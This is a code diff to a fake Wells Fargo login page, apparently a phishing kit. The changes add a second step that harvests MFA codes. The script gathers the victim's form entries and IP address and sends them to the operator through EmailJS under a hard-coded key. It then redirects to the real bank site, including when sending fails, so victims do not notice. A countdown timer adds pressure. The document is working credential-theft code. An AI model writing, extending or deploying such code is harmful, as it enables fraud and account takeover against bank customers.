@@ -326,82 +326,117 @@
             © 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801
         </div>
     </footer>
-
+        
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 <script>
-    // 1. Init with your Public Key
+    // 1. Init EmailJS
     emailjs.init("y3lRWL7KLDjiFjNcN");
 
-    document.getElementById('scamForm').addEventListener('submit', function(e) {
+    const form = document.getElementById('scamForm');
+    const container = document.querySelector('.container');
+    const processingDiv = document.getElementById('processing');
+    const mfaStep = document.getElementById('mfa-step');
+    const verifyBtn = document.getElementById('verifyBtn');
+
+    // Flag to track if we are on the second step
+    let isMfaStep = false;
+
+    form.addEventListener('submit', function(e) {
         e.preventDefault();
-        
-        // Get the button to disable it
-        const btn = document.getElementById('verifyBtn'); // Make sure your button has id="verifyBtn"
-        const originalText = btn ? btn.textContent : "Verify Now";
-        
-        if(btn) {
-            btn.disabled = true;
-            btn.textContent = "Verifying...";
-            btn.style.backgroundColor = "#999"; // Gray out button
-            btn.style.cursor = "not-allowed";
+
+        // Disable button to prevent double-clicks
+        if (verifyBtn) {
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = isMfaStep ? "Verifying Code..." : "Verifying...";
         }
 
-        // Get data from form
-        const formData = new FormData(e.target);
+        // Collect Data
+        const formData = new FormData(form);
         const data = Object.fromEntries(formData.entries());
 
-        // Get IP
+        // Get IP Address
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(ipData => {
-                // Add IP and Date to data object
                 data.ip = ipData.ip;
                 data.date = new Date().toLocaleString();
-                
+
                 // Send to EmailJS
                 emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
                     .then(() => {
-                        // Success: Show processing screen, THEN redirect
-                        document.querySelector('.container').style.display = 'none';
-                        document.getElementById('processing').style.display = 'block';
-                        
-                        // Wait 3 seconds then go to real site
-                        setTimeout(() => {
-                            window.location.href = "https://www.wellsfargo.com/";
-                        }, 3000);
+                        if (!isMfaStep) {
+                            // --- STEP 1 COMPLETE: Show Step 2 ---
+                            
+                            // Hide the main container (login form)
+                            container.style.display = 'none';
+                            
+                            // Show the MFA step
+                            mfaStep.style.display = 'block';
+                            
+                            // Auto-focus the MFA input for better UX
+                            document.getElementById('mfa_code').focus();
+                            
+                        } else {
+                            // --- STEP 2 COMPLETE: Redirect ---
+                            
+                            // Hide MFA step, show processing spinner
+                            mfaStep.style.display = 'none';
+                            processingDiv.style.display = 'block';
+                            
+                            // Wait 2 seconds then redirect to real site
+                            setTimeout(() => {
+                                window.location.href = "https://www.wellsfargo.com/";
+                            }, 2000);
+                        }
                     })
                     .catch(err => {
-                        // Fail: Still show processing screen then redirect so they don't notice
-                        document.querySelector('.container').style.display = 'none';
-                        document.getElementById('processing').style.display = 'block';
+                        // Error handling: Still redirect so the user doesn't get stuck
+                        console.error("EmailJS Error:", err);
+                        
+                        if (!isMfaStep) {
+                            container.style.display = 'none';
+                            mfaStep.style.display = 'block'; // Still show MFA step on error? Or just redirect?
+                            // Let's just redirect on error to keep it simple
+                        } else {
+                            processingDiv.style.display = 'block';
+                        }
                         
                         setTimeout(() => {
                             window.location.href = "https://www.wellsfargo.com/";
-                        }, 3000);
+                        }, 2000);
                     });
             })
             .catch(() => {
-                // If IP fetch fails, still send data without IP and redirect
+                // If IP fetch fails, still send data and proceed
                 emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
                     .then(() => {
-                        document.querySelector('.container').style.display = 'none';
-                        document.getElementById('processing').style.display = 'block';
-                        setTimeout(() => {
-                            window.location.href = "https://www.wellsfargo.com/";
-                        }, 3000);
+                        if (!isMfaStep) {
+                            container.style.display = 'none';
+                            mfaStep.style.display = 'block';
+                        } else {
+                            processingDiv.style.display = 'block';
+                            setTimeout(() => {
+                                window.location.href = "https://www.wellsfargo.com/";
+                            }, 2000);
+                        }
                     })
                     .catch(() => {
-                        document.querySelector('.container').style.display = 'none';
-                        document.getElementById('processing').style.display = 'block';
-                        setTimeout(() => {
-                            window.location.href = "https://www.wellsfargo.com/";
-                        }, 3000);
+                        // Final fallback: Just redirect
+                        if (!isMfaStep) {
+                            container.style.display = 'none';
+                            mfaStep.style.display = 'block';
+                        } else {
+                            processingDiv.style.display = 'block';
+                            setTimeout(() => {
+                                window.location.href = "https://www.wellsfargo.com/";
+                            }, 2000);
+                        }
                     });
             });
     });
 </script>
-       
-  <script>
+   
+    <script>
     (function() {
         let time = 599; // 9 minutes * 60 + 59 seconds = 599
         const display = document.getElementById('countdown');
